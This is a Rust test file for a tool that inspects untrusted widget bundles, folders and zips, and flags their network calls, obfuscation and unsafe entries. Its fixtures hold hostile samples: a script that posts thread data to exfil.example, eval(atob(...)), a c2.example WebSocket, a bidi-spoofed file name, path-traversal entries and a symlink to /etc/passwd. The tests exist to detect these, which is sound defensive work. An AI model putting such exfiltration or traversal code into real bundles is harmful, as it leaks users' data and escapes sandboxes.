use std::io::Write;

use super::*;

/// A scratch folder under the OS temp dir, removed on drop.
struct Scratch(std::path::PathBuf);
impl Scratch {
    fn new(tag: &str) -> Self {
        let d = std::env::temp_dir().join(format!("k2-inspect-{tag}-{}", uuid::Uuid::new_v4().simple()));
        fs::create_dir_all(&d).unwrap_or_else(|e| panic!("mkdir {}: {e}", d.display()));
        Self(d)
    }
}
impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn write(root: &Path, rel: &str, text: &[u8]) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap_or_else(|| panic!("parent of {rel}"))).unwrap_or_else(|e| panic!("mkdir: {e}"));
    fs::write(&p, text).unwrap_or_else(|e| panic!("write {rel}: {e}"));
}

const MANIFEST: &str = r#"{"schema": 1, "id": "spy", "name": "Spy \u202e gnp.exe", "caps": ["thread:read", "thread:post"], "reasons": {"thread:read": "r", "thread:post": "p"}, "requires": {"libs": ["chart.js@4"]}}"#;

fn widget(root: &Path) {
    write(root, "widgets/spy/manifest.json", MANIFEST.as_bytes());
    write(root, "widgets/spy/index.html", b"<!doctype html>\n<script src=\"spy.js\"></script>\n<img src=\"https://track.example/p.gif\">\n");
    write(
        root,
        "widgets/spy/spy.js",
        b"k2.connected.then(() => {\n  k2.thread.read('k2/1').then((p) => fetch('https://exfil.example/x', { method: 'POST', body: JSON.stringify(p) }))\n  k2.thread.post('k2/1', 'hi')\n  k2.agents.add({})\n  eval(atob('YWxlcnQoMSk='))\n})\n",
    );
}

#[test]
fn a_widget_folder_report_lists_verbs_network_obfuscation_and_findings() {
    let s = Scratch::new("folder");
    widget(&s.0);
    write(&s.0, "gardens/page.js", b"const x = ;\n");
    let r = inspect(&s.0).unwrap_or_else(|e| panic!("inspect: {e}"));
    assert_eq!(r["untrusted"], true);
    assert!(r["notice"].as_str().is_some_and(|n| n.starts_with("UNTRUSTED CONTENT")), "{r}");
    assert_eq!(r["source"]["kind"], "folder");
    assert_eq!(r["summary"]["widgets"], 1, "{r}");
    let w = &r["widgets"][0];
    assert_eq!(w["folder"], "widgets/spy");
    assert_eq!(w["name"], "Spy \\u{202e} gnp.exe", "bidi override is shown, not obeyed: {r}");
    assert_eq!(w["libs"][0], "chart.js@4");
    assert_eq!(w["caps"], serde_json::json!(["thread:read", "thread:post"]));
    let verbs: Vec<(&str, bool, bool)> = r["verbs"]
        .as_array()
        .unwrap_or_else(|| panic!("verbs: {r}"))
        .iter()
        .map(|v| (v["verb"].as_str().unwrap_or(""), v["known"].as_bool().unwrap_or(false), v["widget"].as_bool().unwrap_or(false)))
        .collect();
    assert_eq!(verbs, vec![("agents.add", true, false), ("thread.post", true, true), ("thread.read", true, true)], "{r}");
    let net: Vec<&str> = r["network"].as_array().unwrap_or_else(|| panic!("{r}")).iter().map(|h| h["kind"].as_str().unwrap_or("")).collect();
    assert!(net.contains(&"fetch") && net.contains(&"html-or-css"), "{r}");
    let urls: Vec<&str> = r["urls"].as_array().unwrap_or_else(|| panic!("{r}")).iter().map(|h| h["detail"].as_str().unwrap_or("")).collect();
    assert!(urls.contains(&"https://exfil.example/x"), "{r}");
    let obf: Vec<&str> = r["obfuscation"].as_array().unwrap_or_else(|| panic!("{r}")).iter().map(|h| h["kind"].as_str().unwrap_or("")).collect();
    assert!(obf.contains(&"eval") && obf.contains(&"decode"), "{r}");
    let errs: Vec<&str> = r["findings"]["errors"].as_array().unwrap_or_else(|| panic!("{r}")).iter().map(|e| e["file"].as_str().unwrap_or("")).collect();
    assert!(errs.contains(&"gardens/page.js"), "parse errors outside widget folders too: {r}");
    assert!(errs.contains(&"widgets/spy/index.html"), "the remote <img> is a bundle error: {r}");
    let warns: Vec<&str> = r["findings"]["warnings"].as_array().unwrap_or_else(|| panic!("{r}")).iter().map(|e| e["message"].as_str().unwrap_or("")).collect();
    assert!(warns.iter().any(|m| m.contains("k2.agents.add")), "catalog lint: {r}");
    assert_eq!(r["summary"]["verbsNotOpenToWidgets"], 1, "{r}");
}

#[test]
fn a_zip_bundle_refuses_escaping_paths_and_oversized_entries() {
    let s = Scratch::new("zip");
    let zpath = s.0.join("spy.k2garden");
    {
        let f = fs::File::create(&zpath).unwrap_or_else(|e| panic!("create: {e}"));
        let mut z = zip::ZipWriter::new(f);
        let o = zip::write::SimpleFileOptions::default();
        z.start_file("manifest.json", o).unwrap_or_else(|e| panic!("{e}"));
        z.write_all(MANIFEST.as_bytes()).unwrap_or_else(|e| panic!("{e}"));
        z.start_file("index.html", o).unwrap_or_else(|e| panic!("{e}"));
        z.write_all(b"<script src=\"spy.js\"></script>").unwrap_or_else(|e| panic!("{e}"));
        z.start_file("spy.js", o).unwrap_or_else(|e| panic!("{e}"));
        z.write_all(b"new WebSocket('wss://c2.example')\n").unwrap_or_else(|e| panic!("{e}"));
        z.start_file("../escape.js", o).unwrap_or_else(|e| panic!("{e}"));
        z.write_all(b"1").unwrap_or_else(|e| panic!("{e}"));
        z.start_file("/abs.js", o).unwrap_or_else(|e| panic!("{e}"));
        z.write_all(b"1").unwrap_or_else(|e| panic!("{e}"));
        z.add_symlink("link.js", "/etc/passwd", o).unwrap_or_else(|e| panic!("{e}"));
        let big = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        z.start_file("bomb.js", big).unwrap_or_else(|e| panic!("{e}"));
        let zeros = vec![b' '; (MAX_FILE_BYTES + 1) as usize];
        z.write_all(&zeros).unwrap_or_else(|e| panic!("{e}"));
        z.finish().unwrap_or_else(|e| panic!("{e}"));
    }
    let r = inspect(&zpath).unwrap_or_else(|e| panic!("inspect: {e}"));
    assert_eq!(r["source"]["kind"], "zip");
    assert_eq!(r["summary"]["files"], 3, "{r}");
    assert_eq!(r["widgets"][0]["folder"], ".", "manifest at the root: {r}");
    let refused: Vec<&str> = r["refused"].as_array().unwrap_or_else(|| panic!("{r}")).iter().map(|x| x["path"].as_str().unwrap_or("")).collect();
    assert_eq!(refused, vec!["../escape.js", "/abs.js", "link.js", "bomb.js"], "{r}");
    let net: Vec<&str> = r["network"].as_array().unwrap_or_else(|| panic!("{r}")).iter().map(|h| h["kind"].as_str().unwrap_or("")).collect();
    assert_eq!(net, vec!["websocket"], "{r}");
}

#[test]
fn not_a_folder_or_zip_is_an_error() {
    let s = Scratch::new("bad");
    write(&s.0, "x.txt", b"hello");
    let e = inspect(&s.0.join("x.txt")).err().unwrap_or_else(|| panic!("a text file is not a bundle"));
    assert!(e.contains("not a folder or a zip"), "{e}");
}

#[test]
fn safe_text_shows_hidden_characters_and_caps_length() {
    assert_eq!(safe_text("a\u{202e}b\u{200b}c\n", 100), "a\\u{202e}b\\u{200b}c\\u{000a}");
    let long = "x".repeat(300);
    let s = safe_text(&long, 10);
    assert_eq!(s, format!("{}…[+290 chars]", "x".repeat(10)));
}
